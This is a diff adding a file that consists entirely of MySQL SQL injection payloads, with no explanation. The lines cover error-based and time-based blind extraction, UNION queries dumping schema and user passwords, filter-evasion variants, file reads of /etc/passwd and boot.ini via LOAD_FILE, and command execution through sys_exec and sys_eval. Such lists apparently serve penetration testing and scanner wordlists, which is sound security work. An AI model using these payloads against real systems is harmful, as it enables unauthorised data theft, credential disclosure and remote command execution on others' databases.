@@ -1,0 +1,19 @@
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x3a, (SELECT @@version), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) -- -
+' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT DATABASE()))) -- -
+' AND UPDATEXML(NULL, CONCAT(0x3a, (SELECT USER())), NULL) -- -
+' AND (SELECT SUBSTRING(@@version,1,1))='5' -- -
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))=115 -- -
+' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password)>0) -- -
+' AND IF(1=1, SLEEP(5), 0) -- -
+' AND SLEEP(5) -- -
+' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97, SLEEP(5), 0) -- -
+' UNION SELECT NULL, NULL, NULL -- -
+' UNION SELECT 1, 'user', 'pass' FROM users -- -
+' UNION SELECT table_name, column_name, NULL FROM information_schema.columns WHERE table_schema=DATABASE() -- -
+' /*!50000UNION*/ /*!50000SELECT*/ NULL, NULL, NULL -- -
+' UNION/**/SELECT/**/NULL,NULL,NULL -- -
+' UNION SELECT 1, CONCAT(CHAR(117,115,101,114), CHAR(58), USER()), NULL -- -
+' UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL -- -
+' UNION SELECT NULL, NULL, LOAD_FILE('C:\\boot.ini') -- -
+' UNION SELECT sys_exec('id'), NULL, NULL -- -
+' UNION SELECT sys_eval('ls'), NULL, NULL -- -
